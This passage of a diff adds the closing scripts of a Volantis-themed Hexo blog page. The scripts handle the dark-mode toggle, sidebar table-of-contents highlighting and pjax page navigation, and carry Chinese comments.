+  light: "dark",
+};
+
+/**
+ * get target mode
+ */
+const toggleCustomDarkMode = () => {
+  let currentSetting = getLS(darkModeStorageKey);
+
+  if (validColorModeKeys[currentSetting]) {
+    currentSetting = invertDarkModeObj[currentSetting];
+  } else if (currentSetting === null) {
+    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
+  } else {
+    return;
+  }
+  setLS(darkModeStorageKey, currentSetting);
+  return currentSetting;
+};
+
+/**
+ * bind click event for toggle button
+ */
+var btn=$("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn");
+function bindToggleButton() {
+    btn.on('click',(e) => {
+      const mode = toggleCustomDarkMode();
+      applyCustomDarkModeSettings(mode);
+    });
+}
+
+applyCustomDarkModeSettings();
+document.addEventListener("DOMContentLoaded", bindToggleButton);
+volantis.pjax.push(bindToggleButton);
+volantis.pjax.send(()=>{
+	btn.unbind('click');
+},'toggle-mode-btn-unbind');
+</script>
+
+
+
+
+
+
+
+
+<script>
+function listennSidebarTOC() {
+  const navItems = document.querySelectorAll(".toc li");
+  if (!navItems.length) return;
+  const sections = [...navItems].map((element) => {
+    const link = element.querySelector(".toc-link");
+    const target = document.getElementById(
+      decodeURI(link.getAttribute("href")).replace("#", "")
+    );
+    link.addEventListener("click", (event) => {
+      event.preventDefault();
+      window.scrollTo({
+		top: target.offsetTop + 100,
+		
+		behavior: "smooth"
+		
+	  });
+    });
+    return target;
+  });
+
+  function activateNavByIndex(target) {
+    if (target.classList.contains("active-current")) return;
+
+    document.querySelectorAll(".toc .active").forEach((element) => {
+      element.classList.remove("active", "active-current");
+    });
+    target.classList.add("active", "active-current");
+    let parent = target.parentNode;
+    while (!parent.matches(".toc")) {
+      if (parent.matches("li")) parent.classList.add("active");
+      parent = parent.parentNode;
+    }
+  }
+
+  function findIndex(entries) {
+    let index = 0;
+    let entry = entries[index];
+    if (entry.boundingClientRect.top > 0) {
+      index = sections.indexOf(entry.target);
+      return index === 0 ? 0 : index - 1;
+    }
+    for (; index < entries.length; index++) {
+      if (entries[index].boundingClientRect.top <= 0) {
+        entry = entries[index];
+      } else {
+        return sections.indexOf(entry.target);
+      }
+    }
+    return sections.indexOf(entry.target);
+  }
+
+  function createIntersectionObserver(marginTop) {
+    marginTop = Math.floor(marginTop + 10000);
+    let intersectionObserver = new IntersectionObserver(
+      (entries, observe) => {
+        let scrollHeight = document.documentElement.scrollHeight + 100;
+        if (scrollHeight > marginTop) {
+          observe.disconnect();
+          createIntersectionObserver(scrollHeight);
+          return;
+        }
+        let index = findIndex(entries);
+        activateNavByIndex(navItems[index]);
+      },
+      {
+        rootMargin: marginTop + "px 0px -100% 0px",
+        threshold: 0,
+      }
+    );
+    sections.forEach((element) => {
+      element && intersectionObserver.observe(element);
+    });
+  }
+  createIntersectionObserver(document.documentElement.scrollHeight);
+}
+
+document.addEventListener("DOMContentLoaded", listennSidebarTOC);
+document.addEventListener("pjax:success", listennSidebarTOC);
+</script>
+
+<!-- more -->
+
+ 
+	   
+	    
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+
+      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
+      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      volantis.$topBtn.unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.send.start();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+      try{
+		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
+		volantis.pjax.method.complete.start();
+      } catch (e) {
+        console.log(e);
+      }
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.error.start();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+ 
+	  
+    </div>
+  </body>
+</html>
